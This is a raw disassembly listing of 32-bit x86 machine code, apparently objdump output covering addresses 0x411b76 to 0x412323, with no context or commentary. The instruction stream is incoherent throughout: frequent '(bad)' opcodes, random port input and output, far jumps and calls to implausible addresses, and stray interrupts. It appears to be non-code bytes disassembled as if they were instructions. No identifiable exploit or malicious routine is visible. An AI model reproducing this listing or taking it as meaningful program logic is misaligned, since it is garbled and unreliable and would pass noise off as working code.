  411b76:	xchg   ecx,eax
  411b77:	push   edx
  411b78:	call   0xa98ace10
  411b7d:	jecxz  0x411b85
  411b7f:	lock pop ebp
  411b81:	add    BYTE PTR [eax],al
  411b83:	add    BYTE PTR [eax],al
  411b85:	add    BYTE PTR [edi-0x8],dh
  411b88:	or     eax,0xd92793e9
  411b8d:	push   es
  411b8e:	out    0x8f,eax
  411b90:	push   edx
  411b91:	call   0xf698ce29
  411b96:	(bad)  
  411b97:	(bad)  
  411b98:	push   edx
  411b99:	call   0x9e30ce31
  411b9e:	push   0x93e90df8
  411ba3:	add    DWORD PTR [edx+eiz*4-0x31070f54],eax
  411baa:	mov    eax,ds:0x4600ce36
  411baf:	xor    eax,0xb0291a41
  411bb4:	push   DWORD PTR [ebp-0x4a00508c]
  411bba:	ins    BYTE PTR es:[edi],dx
  411bbb:	mov    ah,0xcd
  411bbd:	loope  0x411be0
  411bbf:	pop    edi
  411bc0:	mov    DWORD PTR [ebx],0x723700
  411bc6:	int    0x3a
  411bc8:	in     al,0xe9
  411bca:	mov    bl,0xab
  411bcc:	lock jmp FWORD PTR [edi+edx*8-0x212adb9d]
  411bd4:	fimul  DWORD PTR [edi]
  411bd6:	scas   eax,DWORD PTR es:[edi]
  411bd7:	sbb    al,0xe
  411bd9:	setg   BYTE PTR [ebp+ecx*1-0x3f]
  411bde:	dec    eax
  411bdf:	pop    esi
  411be0:	add    al,0xc8
  411be2:	jmp    0xe344:0xd3a6fa0
  411be9:	mov    eax,DWORD PTR [eax]
  411beb:	add    BYTE PTR [eax],al
  411bed:	add    BYTE PTR [eax],al
  411bef:	sub    eax,0xa901534a
  411bf4:	scas   eax,DWORD PTR es:[edi]
  411bf5:	dec    esi
  411bf6:	push   eax
  411bf7:	pop    ds
  411bf8:	ret    
  411bf9:	mov    ebx,0xeb10524
  411bfe:	add    BYTE PTR [edx],bh
  411c00:	hlt    
  411c01:	or     al,0xff
  411c03:	cmp    eax,0xa901534a
  411c08:	scas   eax,DWORD PTR es:[edi]
  411c09:	or     ebx,0x4e
  411c0c:	ret    0x24bb
  411c0f:	xor    eax,0x96000eb0
  411c14:	cli    
  411c15:	sub    ebx,DWORD PTR [eax+ebp*2-0x51]
  411c19:	push   cs
  411c1a:	jmp    FWORD PTR [ebp+0x7901534a]
  411c20:	scas   eax,DWORD PTR es:[edi]
  411c21:	out    0xce,al
  411c23:	cmp    al,0xc2
  411c25:	lock test DWORD PTR [ecx],ebp
  411c28:	mov    dl,0x89
  411c2a:	fst    DWORD PTR [eax+0x39000b62]
  411c30:	rcl    DWORD PTR [esi+edi*8],0x3f
  411c34:	mov    cs,WORD PTR ds:0xe4ac5b6
  411c3a:	mov    dh,0xd5
  411c3c:	inc    edi
  411c3d:	dec    esp
  411c3e:	loopne 0x411bd8
  411c40:	push   eax
  411c41:	xor    eax,DWORD PTR [edx]
  411c43:	sub    ecx,ecx
  411c45:	cmp    bh,0xc3
  411c48:	lds    edx,FWORD PTR [ecx]
  411c4a:	call   0xfe5f612e
  411c4f:	xchg   edi,eax
  411c50:	add    esi,DWORD PTR [ecx+0x0]
  411c56:	add    BYTE PTR [eax],al
  411c58:	(bad)  
  411c59:	fwait
  411c5a:	enter  0xd101,0x29
  411c5e:	repz or bl,al
  411c61:	iret   
  411c62:	cmp    BYTE PTR [edx],ch
  411c64:	rcl    ecx,0xb7
  411c67:	and    eax,DWORD PTR [eax+0x713c09df]
  411c6d:	ja     0x411c5a
  411c6f:	mov    bl,BYTE PTR [ebp*4+0x499000b6]
  411c76:	jb     0x411cc0
  411c78:	xchg   esp,eax
  411c79:	loop   0x411c2a
  411c7b:	and    ebp,DWORD PTR [eax+eiz*8+0x6f]
  411c7f:	and    eax,DWORD PTR [edx+ecx*2+0xb]
  411c83:	add    BYTE PTR [ebx],bl
  411c85:	push   edx
  411c86:	je     0x411c13
  411c88:	je     0x411ca7
  411c8a:	or     al,0x0
  411c8c:	nop
  411c8d:	rol    BYTE PTR [edi],0x89
  411c90:	add    al,0x68
  411c92:	out    0x3b,eax
  411c94:	call   0x9a75a411
  411c99:	dec    ebx
  411c9a:	or     edi,DWORD PTR [ecx+ebx*8]
  411c9d:	dec    eax
  411c9e:	xchg   DWORD PTR [edx+ecx*4],ebp
  411ca1:	dec    ebx
  411ca2:	or     edi,DWORD PTR [edx+ecx*8]
  411ca5:	js     0x411c2e
  411ca7:	and    al,0x7a
  411ca9:	mov    dl,0xe5
  411cab:	add    edx,DWORD PTR [ebp+edi*8-0x43537820]
  411cb2:	in     eax,0x3
  411cb4:	test   bh,dh
  411cb6:	rol    BYTE PTR [edi+0x3e5bca4],1
  411cbc:	add    BYTE PTR [eax],al
  411cbe:	add    BYTE PTR [eax],al
  411cc0:	add    BYTE PTR [ecx+edi*8+0x39],dh
  411cc4:	cld    
  411cc5:	imul   edx,esp,0xffffffe8
  411cc8:	mov    dh,bl
  411cca:	mov    dl,0xe5
  411ccc:	add    ecx,DWORD PTR [edi+0xb033320]
  411cd2:	out    dx,eax
  411cd3:	leave  
  411cd4:	repz rcl BYTE PTR [ebp+ebp*8-0x2],1
  411cd9:	cmp    eax,0xcffae9f3
  411cde:	sub    edx,DWORD PTR [eax-0x78]
  411ce1:	neg    DWORD PTR [ecx-0x1b]
  411ce4:	adc    BYTE PTR [ebx-0x7c39433c],0xd6
  411ceb:	in     eax,dx
  411cec:	rcr    BYTE PTR [edi],cl
  411cee:	repz jle 0x411cb8
  411cf1:	lahf   
  411cf2:	dec    ebp
  411cf3:	pop    ss
  411cf4:	jnp    0x411d4c
  411cf6:	ret    0xbf6c
  411cf9:	fwait
  411cfa:	lea    esp,[ebx]
  411cfc:	add    DWORD PTR [ebx+0x11087cc4],0x1a54e92c
  411d06:	bnd jmp 0x90cef786
  411d0c:	fwait
  411d0d:	sub    DWORD PTR [edx-0x51183f82],esi
  411d13:	bound  ecx,QWORD PTR [eax]
  411d15:	mov    ds:0xb387def8,al
  411d1a:	jmp    0x82fb:0xd99003e6
  411d21:	aaa    
  411d22:	mov    ah,0x7e
  411d24:	mov    BYTE PTR [eax],al
  411d26:	add    BYTE PTR [eax],al
  411d28:	add    BYTE PTR [eax],al
  411d2a:	mov    bl,0xea
  411d2c:	push   cs
  411d2d:	call   0x5ec4cfc5
  411d32:	fcomp  DWORD PTR [ecx-0x11]
  411d35:	jmp    0xf56c0b0e
  411d3a:	sbb    BYTE PTR [edx+0x7a],ch
  411d3d:	and    DWORD PTR [ebp+0x2],edx
  411d40:	or     edx,DWORD PTR [ebx+edx*2+0x2c]
  411d44:	or     eax,0xe450e70
  411d49:	jmp    0xd98e4ae1
  411d4e:	int3   
  411d4f:	jns    0x411d5d
  411d51:	sbb    DWORD PTR [edi-0x159fd1e],ecx
  411d57:	lods   al,BYTE PTR ds:[esi]
  411d58:	out    dx,eax
  411d59:	hlt    
  411d5a:	aas    
  411d5b:	mov    edi,0xcd8ae94e
  411d60:	sub    cl,cl
  411d62:	adc    dh,BYTE PTR [ebp+0x2]
  411d65:	jb     0x411d2f
  411d67:	les    eax,FWORD PTR [ebx-0x75d613f4]
  411d6d:	int    0x2b
  411d6f:	mov    dl,0xe
  411d71:	jmp    0x216c12d0
  411d76:	push   ebp
  411d77:	int    0x2a
  411d79:	std    
  411d7a:	dec    esp
  411d7b:	xor    eax,0xb28cb92a
  411d80:	push   cs
  411d81:	inc    eax
  411d82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d83:	gs out dx,eax
  411d85:	inc    esi
  411d86:	cmp    al,BYTE PTR ds:0xd613d92b
  411d8c:	push   cs
  411d8d:	pushf  
  411d8e:	add    BYTE PTR [eax],al
  411d90:	add    BYTE PTR [eax],al
  411d92:	add    BYTE PTR [edx],ch
  411d94:	cmc    
  411d95:	sub    dh,cl
  411d97:	sbb    al,0x35
  411d99:	sub    bh,BYTE PTR [ecx-0x11f14d74]
  411d9f:	pop    ss
  411da0:	sub    bl,dh
  411da2:	push   ss
  411da3:	xchg   esi,eax
  411da4:	pushf  
  411da5:	push   edx
  411da6:	lds    esi,FWORD PTR [edi-0x57]
  411da9:	mov    al,BYTE PTR [eax]
  411dab:	out    0xac,eax
  411dad:	lock (bad) 
  411daf:	stc    
  411db0:	imul   ebp,DWORD PTR [esi+0x6a],0x83c64d7b
  411db7:	mov    BYTE PTR [ebp-0x25defca9],ah
  411dbd:	mov    esp,DWORD PTR [ecx*4+0x79000eb3]
  411dc4:	cs jb  0x411dc7
  411dc7:	xchg   bl,bl
  411dc9:	and    DWORD PTR [ecx+esi*2],0xffffffb3
  411dcd:	push   cs
  411dce:	add    BYTE PTR [ecx+0x461a8a55],cl
  411dd4:	mov    ah,0xe
  411dd6:	push   esi
  411dd7:	out    dx,al
  411dd8:	cli    
  411dd9:	sub    ebx,DWORD PTR [eax+ebp*1-0x4c]
  411ddd:	push   cs
  411dde:	(bad)  
  411ddf:	les    esi,FWORD PTR [ecx+0x6fd574ef]
  411de5:	test   bl,cl
  411de7:	(bad)  
  411de8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411de9:	mov    ebx,0xeb3ad24
  411dee:	add    BYTE PTR [esi-0x6],ch
  411df1:	sub    ebx,DWORD PTR [eax+edi*8-0x4d]
  411df5:	push   cs
  411df6:	inc    DWORD PTR [eax]
  411df8:	add    BYTE PTR [eax],al
  411dfa:	add    BYTE PTR [eax],al
  411dfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dfd:	dec    edx
  411dfe:	push   ebx
  411dff:	add    ecx,ebp
  411e01:	mov    bl,0xe6
  411e03:	or     ah,BYTE PTR [ebp-0x5b]
  411e06:	lock test DWORD PTR [ecx+0x55],edi
  411e0a:	mov    dl,BYTE PTR ds:0x8b0eb3c1
  411e10:	push   ebp
  411e11:	dec    edx
  411e12:	push   edi
  411e13:	add    DWORD PTR [ecx-0x512d764d],edi
  411e19:	xor    BYTE PTR [eax+ebx*1+0x6c83b3a9],ah
  411e20:	lds    esp,FWORD PTR [ebx-0x1a]
  411e23:	jmp    0x394fd1ae
  411e28:	nop
  411e29:	cmp    BYTE PTR [edi-0x5d7b768d],bh
  411e2f:	addr16 xchg ebp,eax
  411e32:	cli    
  411e33:	pop    ds
  411e34:	nop
  411e35:	dec    ecx
  411e36:	sbb    DWORD PTR [ebx+0xc39ac],eax
  411e3c:	nop
  411e3d:	dec    ebx
  411e3e:	xchg   edi,eax
  411e3f:	imul   ecx,DWORD PTR [ebx],0xffffffa0
  411e42:	xchg   edx,eax
  411e43:	cmp    ch,BYTE PTR [ecx-0x3]
  411e46:	mov    eax,ds:0xf1ede73a
  411e4b:	add    DWORD PTR [esi+0x48],0xb
  411e4f:	add    BYTE PTR [ebx],cl
  411e51:	mov    eax,0x9d4284e2
  411e56:	loope  0x411e92
  411e58:	dec    ecx
  411e59:	push   eax
  411e5a:	mov    esi,esp
  411e5c:	jg     0x411ea7
  411e5e:	or     edx,DWORD PTR [esi+0x0]
  411e61:	add    BYTE PTR [eax],al
  411e63:	add    BYTE PTR [eax],al
  411e65:	add    eax,0x614ffe88
  411e6a:	in     al,0x36
  411e6c:	out    0x9b,eax
  411e6e:	fwait
  411e6f:	or     al,0x0
  411e71:	adc    eax,0xe283f209
  411e76:	dec    edi
  411e77:	or     eax,DWORD PTR [eax]
  411e79:	sti    
  411e7a:	sbb    BYTE PTR [esi+0x56],dh
  411e7d:	test   dh,cl
  411e7f:	pop    es
  411e80:	adc    DWORD PTR [ebx-0x2d7e0dbf],ebx
  411e86:	scas   eax,DWORD PTR es:[edi]
  411e87:	or     al,BYTE PTR [eax]
  411e89:	sbb    esp,DWORD PTR [esi+edx*8-0x3ab5e537]
  411e90:	inc    esi
  411e91:	ins    BYTE PTR es:[edi],dx
  411e92:	js     0x411e1c
  411e94:	mov    dl,0x97
  411e96:	dec    ecx
  411e97:	or     esi,DWORD PTR [ebx]
  411e99:	ror    BYTE PTR [eax],1
  411e9b:	(bad)  
  411e9c:	iret   
  411e9d:	sbb    al,0x4d
  411e9f:	jne    0x411ee1
  411ea1:	xchg   ecx,eax
  411ea2:	arpl   dx,cx
  411ea4:	sub    al,0x87
  411ea6:	mov    dl,0x62
  411ea8:	arpl   WORD PTR [esi+0x78c6e5b2],bp
  411eae:	inc    ecx
  411eaf:	sbb    ecx,DWORD PTR [esi+edi*2]
  411eb2:	call   0xec56:0x2f869ba0
  411eb9:	outs   dx,DWORD PTR ds:[esi]
  411eba:	push   esi
  411ebb:	stos   BYTE PTR es:[edi],al
  411ebc:	sbb    dl,BYTE PTR [ebx+ebx*2+0x2e0a0bf8]
  411ec3:	ins    DWORD PTR es:[edi],dx
  411ec4:	add    edx,DWORD PTR [eax+0xc2e4b2]
  411eca:	add    BYTE PTR [eax],al
  411ecc:	add    BYTE PTR [eax],al
  411ece:	mov    bh,0x99
  411ed0:	int    0x1f
  411ed2:	sub    ch,BYTE PTR cs:[ebp+edi*2+0x5258f0b]
  411eda:	nop
  411edb:	mov    dl,0xdc
  411edd:	es and eax,0x90b4092f
  411ee3:	mov    dl,0xe5
  411ee5:	add    eax,0xbb6ce4a4
  411eea:	stos   DWORD PTR es:[edi],eax
  411eeb:	cdq    
  411eec:	into   
  411eed:	xchg   edi,eax
  411eee:	into   
  411eef:	sub    DWORD PTR [eax],edi
  411ef1:	in     al,dx
  411ef2:	or     al,0x81
  411ef4:	adc    esi,esi
  411ef6:	gs daa 
  411ef8:	sub    al,ch
  411efa:	inc    edi
  411efb:	add    edi,DWORD PTR [ebp+0x3f]
  411efe:	test   DWORD PTR [edi+0x15],0x84b9006
  411f05:	or     ebx,esi
  411f07:	push   ebp
  411f08:	int3   
  411f09:	mov    edx,0xfb4e997b
  411f0e:	push   ss
  411f0f:	xchg   ebp,eax
  411f10:	lock add edx,DWORD PTR [eax+0x56cde428]
  411f17:	xchg   al,dl
  411f19:	add    BYTE PTR [edx+0x6303e5b5],0x72
  411f20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f21:	int3   
  411f22:	dec    esi
  411f23:	mov    dh,0xe
  411f25:	mov    ebp,0xe84b2b1e
  411f2a:	je     0x411f07
  411f2c:	out    dx,eax
  411f2d:	es fwait
  411f2f:	call   0x0:0xa977
  411f36:	add    BYTE PTR [esi+ebx*8-0x6574e911],ah
  411f3d:	ja     0x411ee8
  411f3f:	jp     0x411f6f
  411f41:	sbb    al,0xe6
  411f43:	xchg   ebx,eax
  411f44:	mov    dl,0x35
  411f46:	jbe    0x411f6b
  411f48:	fisub  WORD PTR [ebx+0x62]
  411f4b:	push   ebx
  411f4c:	leave  
  411f4d:	xor    edx,DWORD PTR [ecx]
  411f4f:	pop    ebx
  411f50:	xor    DWORD PTR [esi+eiz*8-0x66],ebp
  411f54:	push   esp
  411f55:	xor    DWORD PTR [esi],0x34
  411f58:	fcomp  QWORD PTR cs:[ebp+0x36]
  411f5c:	cwde   
  411f5d:	(bad)  
  411f5e:	fimul  WORD PTR [esi]
  411f60:	pusha  
  411f61:	adc    cl,ch
  411f63:	xchg   ebx,eax
  411f64:	cld    
  411f65:	sub    DWORD PTR [esi],0x625f0238
  411f6b:	pop    esi
  411f6c:	dec    ebp
  411f6d:	jno    0x411f88
  411f6f:	mov    ?,WORD PTR [edx+0x310aa989]
  411f75:	sar    bh,1
  411f77:	xchg   ebx,eax
  411f78:	mov    dl,0x81
  411f7a:	es call 0x3a9d42c7
  411f80:	mov    ecx,0x7cdee823
  411f85:	jmp    DWORD PTR [ebp-0x61]
  411f88:	mov    bh,0xe
  411f8a:	jmp    0x2675cfec
  411f8f:	mov    eax,0xb92889a3
  411f94:	push   esp
  411f95:	out    dx,eax
  411f96:	sbb    cl,BYTE PTR [ebp+edx*4+0x35]
  411f9a:	call   0x411f9f
  411f9f:	add    BYTE PTR [edi],cl
  411fa1:	test   eax,0x988caa84
  411fa6:	inc    edi
  411fa7:	add    BYTE PTR [ecx+ebx*2-0x4f385176],al
  411fae:	push   cs
  411faf:	mov    ebp,esi
  411fb1:	cmp    al,0x24
  411fb3:	add    DWORD PTR [edx-0x48031978],esp
  411fb9:	test   al,0xf0
  411fbb:	cmp    eax,DWORD PTR [esi+0x3c]
  411fbe:	add    BYTE PTR [edx-0x10b600],al
  411fc4:	nop
  411fc5:	lods   al,BYTE PTR ds:[esi]
  411fc6:	out    dx,eax
  411fc7:	call   DWORD PTR [esi+0x526c48d4]
  411fcd:	mov    BYTE PTR [eax],al
  411fcf:	test   BYTE PTR [eax-0xd000f57],dl
  411fd5:	and    BYTE PTR [edi],dl
  411fd7:	test   DWORD PTR [ebx],ecx
  411fd9:	inc    ebx
  411fda:	sub    eax,0x8c5a513b
  411fdf:	ja     0x411f69
  411fe1:	scas   al,BYTE PTR es:[edi]
  411fe2:	push   cs
  411fe3:	push   esi
  411fe4:	aam    0x19
  411fe6:	adc    edx,DWORD PTR [ecx-0x77]
  411fe9:	aad    0xc4
  411feb:	call   0x4e401d
  411ff0:	lods   al,BYTE PTR ds:[esi]
  411ff1:	out    dx,al
  411ff2:	add    BYTE PTR [ebx+ecx*8-0x7b0010b1],al
  411ff9:	sbb    DWORD PTR [ebx],edx
  411ffb:	jmp    0x411fdf
  411ffd:	fadd   QWORD PTR [eax+0x1c]
  412000:	shl    BYTE PTR [eax+0xd833],cl
  412006:	add    BYTE PTR [eax],al
  412008:	add    dh,dl
  41200a:	xor    bh,BYTE PTR [edi]
  41200c:	and    ecx,edi
  41200e:	scas   eax,DWORD PTR es:[edi]
  41200f:	test   BYTE PTR [ebx],al
  412011:	shl    DWORD PTR [edx+0x23],cl
  412014:	(bad)  
  412016:	adc    ebp,DWORD PTR [esi]
  412018:	add    cl,ch
  41201a:	jle    0x411fcb
  41201c:	inc    eax
  41201d:	jo     0x411fce
  41201f:	jp     0x41202d
  412021:	inc    ebx
  412022:	ins    DWORD PTR es:[edi],dx
  412023:	push   cs
  412024:	cmp    dl,BYTE PTR [eax+0xd0ed804]
  41202a:	mov    eax,0xe0afffeb
  41202f:	int    0x6b
  412031:	jnp    0x41207d
  412033:	ret    0x8fd7
  412036:	(bad)  
  412037:	iret   
  412038:	and    BYTE PTR [eax-0x717debb7],dl
  41203e:	mov    WORD PTR ds:0x8041e73a,es
  412044:	push   es
  412045:	ret    
  412046:	mov    DWORD PTR [ecx-0x2b],esi
  412049:	shl    BYTE PTR [eax+0x31cf3ae4],1
  41204f:	sahf   
  412050:	add    eax,0x88060815
  412055:	xlat   BYTE PTR ds:[ebx]
  412056:	loope  0x41204e
  412058:	mov    ch,0xcb
  41205a:	inc    esp
  41205b:	jb     0x4120a3
  41205d:	test   BYTE PTR [ebp+ebx*2+0x13],bl
  412061:	xchg   ecx,eax
  412062:	mov    eax,0x452ac04a
  412067:	retf   
  412068:	and    ah,BYTE PTR [eax-0x40]
  41206b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41206c:	imul   eax,DWORD PTR [eax],0x0
  41206f:	add    BYTE PTR [eax],al
  412071:	add    BYTE PTR [edx-0x5b8175b4],ah
  412077:	dec    ecx
  412078:	jg     0x41208e
  41207a:	pop    ebx
  41207b:	std    
  41207c:	iret   
  41207d:	aas    
  41207e:	xchg   ecx,eax
  41207f:	dec    ecx
  412080:	or     esi,DWORD PTR [esi-0x64]
  412083:	loop   0x412053
  412085:	pop    ebx
  412086:	leave  
  412087:	mov    WORD PTR [esi+0xbd50f0e],es
  41208d:	add    BYTE PTR [eax-0x7d15ca30],dl
  412093:	pop    esp
  412094:	pop    ebp
  412095:	or     bl,BYTE PTR [ebx]
  412097:	mov    esi,ds
  412099:	push   cs
  41209a:	es dec ebp
  41209c:	repz xor dl,al
  41209f:	or     DWORD PTR [ebx+eax*1],edx
  4120a2:	push   eax
  4120a3:	mov    dl,0x4
  4120a5:	cmp    al,0x19
  4120a7:	in     eax,dx
  4120a8:	in     eax,0xbe
  4120aa:	or     dh,al
  4120ac:	add    eax,ebp
  4120ae:	jnp    0x41205d
  4120b0:	(bad)  
  4120b2:	bound  esi,QWORD PTR [edx+0xc]
  4120b5:	ds xchg esi,eax
  4120b7:	ds and eax,0x259f961c
  4120bd:	int3   
  4120be:	leave  
  4120bf:	mov    ds:0x7314435a,al
  4120c4:	clc    
  4120c5:	jle    0x4120f2
  4120c7:	xchg   ebx,eax
  4120c8:	in     eax,0x3
  4120ca:	imul   esi,DWORD PTR [eax+0x16],0xb83e7608
  4120d1:	jmp    0x4120e7
  4120d3:	gs jno 0x412087
  4120d6:	add    BYTE PTR [eax],al
  4120d8:	add    BYTE PTR [eax],al
  4120da:	add    BYTE PTR [edx-0x796b7e0f],ch
  4120e0:	call   0xe2bce14f
  4120e5:	loopne 0x412076
  4120e7:	mov    ebx,0x9d1cbc3d
  4120ec:	add    esp,esp
  4120ee:	add    edx,DWORD PTR ds:0xc380e873
  4120f4:	xchg   edx,eax
  4120f5:	in     eax,0x3
  4120f7:	arpl   WORD PTR [ebx+0x26],di
  4120fa:	jnp    0x41214e
  4120fc:	test   BYTE PTR [edi+edi*4],0xab
  412100:	shl    DWORD PTR [ebx+0x3c],0x14
  412104:	push   edx
  412105:	mov    al,ds:0xe5ce8e83
  41210a:	not    BYTE PTR [ebx]
  41210c:	out    dx,al
  41210d:	lds    eax,FWORD PTR [ebx]
  41210f:	nop
  412110:	lea    edi,[ecx-0x20]
  412113:	mov    bh,0xb3
  412115:	in     eax,0x3
  412117:	lahf   
  412118:	cmp    BYTE PTR [edi],dh
  41211a:	in     al,0xe7
  41211c:	push   ecx
  41211d:	into   
  41211e:	mov    dh,0x5b
  412120:	cmp    ecx,DWORD PTR [esi]
  412122:	es sub cl,al
  412125:	sub    BYTE PTR [ebx],0xb4
  412128:	push   ecx
  412129:	out    dx,eax
  41212a:	rcl    DWORD PTR [edi-0x4bdc1a11],cl
  412130:	push   ecx
  412131:	out    dx,eax
  412132:	(bad)  
  412133:	neg    ebp
  412135:	and    esp,DWORD PTR [esi-0x41297349]
  41213b:	dec    edi
  41213c:	cmp    ecx,DWORD PTR [ebx]
  41213e:	cli    
  41213f:	add    BYTE PTR [eax],al
  412141:	add    BYTE PTR [eax],al
  412143:	add    BYTE PTR [edx+esi*8+0x34],bl
  412147:	scas   al,BYTE PTR es:[edi]
  412148:	mov    edi,0x46f0b9c6
  41214d:	lods   eax,DWORD PTR ds:[esi]
  41214e:	jmp    FWORD PTR [ecx+edi*2-0x4f]
  412152:	push   cs
  412153:	jmp    0xd34f1651
  412158:	ss sahf 
  41215a:	jmp    DWORD PTR [ebp+eiz*2-0x4f]
  41215e:	push   cs
  41215f:	jmp    0x2ac450ee
  412164:	push   ebx
  412165:	mov    WORD PTR [edi-0x7b],es
  412168:	pop    esi
  412169:	xor    edi,DWORD PTR [ecx-0x14]
  41216c:	xchg   esi,eax
  41216d:	push   eax
  41216e:	mov    esp,DWORD PTR [esi+0x18]
  412171:	push   ecx
  412172:	add    BYTE PTR [ebp-0x74],ah
  412175:	mov    al,0xe
  412177:	jmp    0x67408bc6
  41217c:	test   BYTE PTR [eax+0x1142e90e],dh
  412182:	dec    esi
  412183:	add    bh,bl
  412185:	int3   
  412186:	test   DWORD PTR [esi],ebp
  412188:	call   0x3733b1e8
  41218d:	fnstsw WORD PTR [ebx-0x39]
  412190:	inc    BYTE PTR [esi]
  412192:	add    esi,DWORD PTR [edx+0x3e]
  412195:	test   DWORD PTR [ebx-0x61],ecx
  412198:	div    DWORD PTR [ecx+0x4f4d800a]
  41219e:	out    dx,eax
  41219f:	add    BYTE PTR [esi],cl
  4121a1:	jl     0x4121f3
  4121a3:	ins    BYTE PTR es:[edi],dx
  4121a4:	fimul  DWORD PTR [ebp+0xb600]
  4121aa:	add    BYTE PTR [eax],al
  4121ac:	add    dl,dh
  4121ae:	retf   
  4121af:	dec    eax
  4121b0:	xor    al,0x7a
  4121b2:	ror    BYTE PTR [ebx],0x1
  4121b5:	mov    ch,0x47
  4121b7:	mov    edi,DWORD PTR [ebx-0x16f14b42]
  4121bd:	sar    BYTE PTR [ecx+0x1982fff0],0x63
  4121c4:	jae    0x4121c5
  4121c6:	inc    edi
  4121c7:	mov    ecx,0x3b10220b
  4121cc:	xor    edi,DWORD PTR [ebx+0x73]
  4121cf:	dec    esp
  4121d0:	test   BYTE PTR [ebp-0x49],ah
  4121d3:	in     eax,0x74
  4121d5:	scas   eax,DWORD PTR es:[edi]
  4121d6:	mov    eax,0x283e3bf0
  4121db:	jl     0x412174
  4121dd:	outs   dx,BYTE PTR ds:[esi]
  4121de:	inc    BYTE PTR [ebx+ecx*4]
  4121e1:	cmp    BYTE PTR ss:[edx+edx*8],0x3b
  4121e6:	jne    0x412173
  4121e8:	adc    al,0x68
  4121ea:	lods   eax,DWORD PTR ds:[esi]
  4121eb:	lds    edi,FWORD PTR [ebx]
  4121ed:	(bad)  
  4121ee:	daa    
  4121ef:	jl     0x412174
  4121f1:	outs   dx,BYTE PTR ds:[esi]
  4121f2:	inc    BYTE PTR [ebx+ecx*4]
  4121f5:	jbe    0x412259
  4121f7:	dec    esp
  4121f8:	div    BYTE PTR ds:0x72e91eb5
  4121fe:	mov    eax,0x1582fff0
  412203:	arpl   WORD PTR [edi],cx
  412205:	mov    edx,0xdefff02c
  41220a:	inc    ebp
  41220b:	mov    ecx,0x3b0db20b
  412210:	inc    ebx
  412211:	add    BYTE PTR [eax],al
  412213:	add    BYTE PTR [eax],al
  412215:	add    BYTE PTR [edi-0x4d],al
  412218:	or     eax,0x34d62210
  41221d:	pop    edi
  41221e:	lea    eax,[ebp-0x74]
  412221:	push   esp
  412222:	nop
  412223:	sub    BYTE PTR [ecx],cl
  412225:	(bad)  
  412226:	lahf   
  412227:	out    0xd,eax
  412229:	inc    ebx
  41222a:	adc    esi,DWORD PTR [edx]
  41222c:	hlt    
  41222d:	push   cs
  41222e:	adc    al,0x8e
  412230:	push   es
  412231:	(bad)  
  412232:	xlat   BYTE PTR ds:[ebx]
  412233:	pop    eax
  412234:	jno    0x412279
  412236:	scas   eax,DWORD PTR es:[edi]
  412237:	pop    ecx
  412238:	or     eax,DWORD PTR [ebx+0x218145c8]
  41223e:	adc    edx,edx
  412240:	div    DWORD PTR [ebx+0x6b]
  412243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412244:	outs   dx,DWORD PTR ds:[esi]
  412245:	jmp    FWORD PTR [edi+0x65157f59]
  41224b:	shr    dl,0xff
  41224e:	lahf   
  41224f:	pusha  
  412250:	jno    0x412279
  412252:	ja     0x4122ad
  412254:	or     edi,DWORD PTR ds:0xab9b9
  41225a:	xchg   edi,eax
  41225b:	loopne 0x412244
  41225d:	push   ds
  41225e:	nop
  41225f:	pop    ecx
  412260:	les    esi,FWORD PTR [esi-0x10]
  412263:	pop    eax
  412264:	jo     0x412279
  412266:	(bad)  
  412267:	pop    ecx
  412268:	or     ebp,ecx
  41226a:	adc    DWORD PTR [ebp+0x309bfe09],esi
  412270:	xchg   edi,eax
  412271:	push   cs
  412272:	adc    eax,ecx
  412274:	pop    es
  412275:	dec    BYTE PTR [edi-0x27]
  412278:	lds    ecx,FWORD PTR [ecx]
  41227a:	add    BYTE PTR [eax],al
  41227c:	add    BYTE PTR [eax],al
  41227e:	add    BYTE PTR [edi+0x3ffb9ade],dl
  412284:	jo     0x412254
  412286:	call   0xfe4b8834
  41228b:	imul   esp,DWORD PTR [eax+0x64130e96],0x9
  412292:	(bad)  
  412293:	pop    ds
  412294:	pusha  
  412295:	inc    ecx
  412296:	add    bl,dl
  412298:	push   esi
  412299:	jecxz  0x41229a
  41229b:	setl   ch
  41229e:	sar    DWORD PTR [edi-0x4e],0xd4
  4122a2:	hlt    
  4122a3:	adc    ebp,DWORD PTR [ebx-0x11]
  4122a6:	add    edx,DWORD PTR [eax-0x610562cd]
  4122ac:	ss mov bl,0xe5
  4122af:	out    0x4e,eax
  4122b1:	or     edi,DWORD PTR fs:[edi-0x41]
  4122b5:	imul   edi,DWORD PTR [edx],0xc6e5b275
  4122bb:	das    
  4122bc:	mov    dl,0xe5
  4122be:	add    edx,DWORD PTR [edi-0x401a58ca]
  4122c4:	dec    esi
  4122c5:	adc    al,BYTE PTR [ebp+ebx*4+0x13f4e5b2]
  4122cc:	add    ebx,edi
  4122ce:	add    edx,DWORD PTR [eax-0x61f7faa7]
  4122d4:	dec    esi
  4122d5:	repnz add esi,DWORD PTR [eax-0x4e]
  4122d9:	in     eax,0xf4
  4122db:	adc    DWORD PTR [eax-0x6f79fbdf],ebp
  4122e1:	sti    
  4122e2:	jecxz  0x4122e4
  4122e4:	add    BYTE PTR [eax],al
  4122e6:	add    BYTE PTR [eax],al
  4122e8:	jg     0x412338
  4122ea:	loopne 0x412369
  4122ec:	pop    ds
  4122ed:	lods   eax,DWORD PTR ds:[esi]
  4122ee:	in     eax,0x3
  4122f0:	lods   eax,DWORD PTR ds:[esi]
  4122f1:	popf   
  4122f2:	lds    eax,FWORD PTR [ebx]
  4122f4:	nop
  4122f5:	mov    ebp,0xb27d7661
  4122fa:	in     eax,0xc6
  4122fc:	mov    dh,0x92
  4122fe:	in     eax,0x3
  412300:	lahf   
  412301:	ss arpl bp,sp
  412304:	inc    edi
  412305:	dec    esi
  412306:	sub    al,BYTE PTR [eax+eax*4]
  412309:	mov    dl,0xe5
  41230b:	out    dx,al
  41230c:	push   edx
  41230d:	mov    bh,BYTE PTR [eax]
  41230f:	jo     0x4122ae
  412311:	xor    DWORD PTR [eax],esi
  412313:	add    ah,BYTE PTR [esi]
  412315:	dec    esi
  412316:	clc    
  412317:	mov    ecx,0x1bdf0891
  41231c:	nop
  41231d:	mov    dl,0xe
  41231f:	sub    cl,bh
  412321:	jo     0x41239a
  412323:	cld    
